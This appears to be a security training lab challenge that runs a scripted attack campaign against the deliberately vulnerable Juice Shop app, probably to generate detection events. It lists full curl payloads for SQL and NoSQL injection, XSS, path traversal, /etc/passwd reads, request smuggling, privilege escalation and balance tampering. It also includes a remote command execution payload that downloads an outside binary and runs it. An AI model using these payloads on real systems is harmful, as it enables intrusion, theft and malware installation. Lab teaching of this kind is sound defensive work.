---
slug: attacksone
id: svi4nfzpej83
type: challenge
title: Attack Campaign 1
teaser: Next up, we will launch a bunch of attacks against JuiceShop!
notes:
- type: text
  contents: |-
    # Nerd Trivia

    The original codename for Kubernetes was "Project 7", a reference to the _Star Trek_ ex-Borg character [Seven of Nine](https://en.wikipedia.org/wiki/Seven_of_Nine). Since K8s was based on Google's internal container engine, "The Borg", it seemed like an appropriate choice.

    Now you know why the Kubernetes wheel has seven spokes!
tabs:
- title: Workstation
  type: terminal
  hostname: workstation
- title: Juice Shop
  type: service
  hostname: workstation
  port: 3000
difficulty: basic
timelimit: 7200
---

We have created a postman collection containing all the attacks detailed below so we can quickly generate the security events. To run the collection execute the following command


```bash
newman run juiceshopattacks.json -e vars.json
```

For details on the actual attacks being run through newman, vew the corrisponding curl commands below.

<details>

## SQLi In Request Body
```bash
curl -L -X POST '{{scheme}}://{{host}}/rest/user/login' -H 'host: {{host}}' -H 'accept: application/json, text/plain, */*' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36' -H 'content-type: application/json' -H 'origin: {{scheme}}://{{host}}' -H 'referer: {{scheme}}://{{host}}/' -H 'accept-encoding: gzip, deflate' -H 'accept-language: en-US,en;q=0.9' -H 'cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss' -H 'connection: close' --data-raw '{"email": "'\'' or deletedAt IS NOT NULL--","password": "IAmHunting"}'

```
## Mass Assignment

 ```bash
curl -L -X POST '{{scheme}}://{{host}}/api/Users/' -H 'host: {{host}}' -H 'accept: application/json, text/plain, */*' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36' -H 'content-type: application/json' -H 'origin: {{scheme}}://{{host}}' -H 'referer: {{scheme}}://{{host}}/' -H 'accept-encoding: gzip, deflate' -H 'accept-language: en-US,en;q=0.9' -H 'cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss' -H 'connection: close' -H 'X-Forwarded-For: 160.40.32.11' --data-raw '{"email": "jbhack@darkweb.com","password": "jbhack","role": "admin"}'
```
```bash
curl -L -X POST '{{scheme}}://{{host}}/rest/user/login' -H 'host: {{host}}' -H 'accept: application/json, text/plain, */*' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36' -H 'content-type: application/json' -H 'origin: {{scheme}}://{{host}}' -H 'referer: {{scheme}}://{{host}}/' -H 'accept-encoding: gzip, deflate' -H 'accept-language: en-US,en;q=0.9' -H 'cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss' -H 'connection: close' -H 'X-Forwarded-For: 160.40.32.11' --data-raw '{"email": "jbhack@darkweb.com","password": "bW9jLmJld2tyYWRAa2NhaGJq","oauth": true}'
```

# Authenticate Attacks

## XSS
```bash
curl -L -X GET '{{scheme}}://{{host}}/rest/saveLoginIp' -H 'host: {{host}}' -H 'accept: application/json, text/plain, */*' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36' -H 'x-user-email: ' -H 'authorization: Bearer ' -H 'referer: {{scheme}}://{{host}}/' -H 'accept-encoding: gzip, deflate' -H 'accept-language: en-US,en;q=0.9' -H 'cookie:language=en;welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=' -H 'connection: close' -H 'True-Client-IP: <iframe src="javascript:alert(``xss``)">'
```
## SQLi in URL
```bash
curl -L -X GET '{{scheme}}://{{host}}/rest/track-order/'\''%20%7C%7C%20true%20%7C%7C%20'\''' -H 'host: {{host}}' -H 'accept: application/json, text/plain, */*' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36' -H 'x-user-email: ' -H 'authorization: Bearer ' -H 'referer: {{scheme}}://{{host}}/' -H 'accept-encoding: gzip, deflate' -H 'accept-language: en-US,en;q=0.9' -H 'cookie:language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=' -H 'connection: close'
```
```bash
curl -L -X GET '{{scheme}}://{{host}}/rest/products/sleep(9000)/reviews' -H 'host: {{host}}' -H 'accept: application/json, text/plain, */*' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36' -H 'x-user-email: ' -H 'authorization: Bearer ' -H 'referer: {{scheme}}://{{host}}/' -H 'accept-encoding: gzip, deflate' -H 'accept-language: en-US,en;q=0.9' -H 'cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=' -H 'connection: close'
```
## NSQLi Injection
```bash
curl -L -X GET '{{scheme}}://{{host}}/rest/track-order/[$ne]=1' -H 'host: {{host}}' -H 'accept: application/json, text/plain, */*' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36' -H 'x-user-email: ' -H 'authorization: Bearer ' -H 'referer: {{scheme}}://{{host}}/' -H 'accept-encoding: gzip, deflate' -H 'accept-language: en-US,en;q=0.9' -H 'cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=' -H 'connection: close'
```
## Sensitive Files
```bash
curl -L -X GET '{{scheme}}://{{host}}/ftp/package.json.bak%2500.pdf' -H 'host: {{host}}' -H 'accept: application/json, text/plain, */*' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36' -H 'x-user-email: ' -H 'authorization: Bearer ' -H 'referer: {{scheme}}://{{host}}/' -H 'accept-encoding: gzip, deflate' -H 'accept-language: en-US,en;q=0.9' -H 'cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=' -H 'connection: close'
```
## Path Traversal
```bash
curl -L -X GET '{{scheme}}://{{host}}/rest/basket/1/../10' -H 'host: {{host}}' -H 'accept: application/json, text/plain, */*' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36' -H 'x-user-email: ' -H 'authorization: Bearer ' -H 'referer: {{scheme}}://{{host}}/' -H 'accept-encoding: gzip, deflate' -H 'accept-language: en-US,en;q=0.9' -H 'cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=' -H 'connection: close'
```
## Local File Inclusion
```bash
curl -L -X GET '{{scheme}}://{{host}}/rest/basket?file=/etc/passwd' -H 'host: {{host}}' -H 'accept: application/json, text/plain, */*' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36' -H 'x-user-email: ' -H 'authorization: Bearer ' -H 'referer: {{scheme}}://{{host}}/' -H 'accept-encoding: gzip, deflate' -H 'accept-language: en-US,en;q=0.9' -H 'cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=' -H 'connection: close'
```
## NULL Byte Injection
```bash
curl -L -X GET '{{scheme}}://{{host}}/ftp/coupons_2013.md.bak%2500.md' -H 'host: {{host}}' -H 'accept: application/json, text/plain, */*' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36' -H 'x-user-email: ' -H 'authorization: Bearer ' -H 'referer: {{scheme}}://{{host}}/' -H 'accept-encoding: gzip, deflate' -H 'accept-language: en-US,en;q=0.9' -H 'cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=' -H 'connection: close'
```
## Remote Command Execution
```bash
curl -L -X POST '{{scheme}}://{{host}}/profile' -H 'host: {{host}}' -H 'accept: application/json, text/plain, */*' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36' -H 'x-user-email: ' -H 'authorization: Bearer ' -H 'referer: {{scheme}}://{{host}}/' -H 'accept-encoding: gzip, deflate' -H 'accept-language: en-US,en;q=0.9' -H 'cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=' -H 'connection: close' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'username=#{global.process.mainModule.require('\''child_process'\'').exec('\''wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware'\'')}'
```
## Request Smuggling
```bash
curl -L -X POST '{{scheme}}://{{host}}/profile' -H 'host: {{host}}' -H 'accept: application/json, text/plain, */*' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36' -H 'x-user-email: ' -H 'authorization: Bearer ' -H 'referer: {{scheme}}://{{host}}/' -H 'accept-encoding: gzip, deflate' -H 'accept-language: en-US,en;q=0.9' -H 'cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=' -H 'connection: close' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'username=%0aGET /ftp/package.json.bak HTTP/1.1%0a'
```
## BOLA
```bash
curl -L -X POST '{{scheme}}://{{host}}/api/Addresss/' -H 'host: {{host}}' -H 'accept: application/json, text/plain, */*' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36' -H 'x-user-email: ' -H 'authorization: Bearer ' -H 'referer: {{scheme}}://{{host}}/' -H 'accept-encoding: gzip, deflate' -H 'accept-language: en-US,en;q=0.9' -H 'cookie:language=en;welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=' -H 'connection: close' -H 'Content-Type: application/json' --data-raw '{"country": "India","fullName": "Monster Web","mobileNum": true,"zipCode": "50021","streetAddress": "Dark road, Lonely Street,\nAndheri Gufa","city": "Lucifer","state": "Hell"}'
```
```bash
curl -L -X PUT '{{scheme}}://{{host}}/rest/wallet/balance' -H 'host: {{host}}' -H 'accept: application/json, text/plain, */*' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36' -H 'x-user-email: ' -H 'authorization: Bearer ' -H 'referer: {{scheme}}://{{host}}/' -H 'accept-encoding: gzip, deflate' -H 'accept-language: en-US,en;q=0.9' -Hcookie:language=en;welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=' -H 'connection: close' -H 'Content-Type: application/json' --data-raw '{"balance": 100000,"paymentId":}'
```

</details>
